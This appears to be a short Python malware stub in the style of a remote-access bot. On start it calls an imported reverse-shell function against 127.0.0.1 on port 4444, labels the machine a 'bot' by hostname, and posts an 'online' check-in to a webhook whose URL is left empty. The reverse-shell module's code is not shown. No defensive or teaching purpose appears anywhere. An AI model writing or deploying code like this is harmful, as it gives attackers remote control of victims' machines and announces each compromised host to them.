import requests as req
import platform as pla
from modules import reverse_shell
reverse_shell.rsc("127.0.0.1", 4444)

wbh = ""
BOT = pla.node()

def notify():
    req.post(wbh, json={"content": f"Bot {BOT} online."})

if __name__ == "__main__":
    notify()
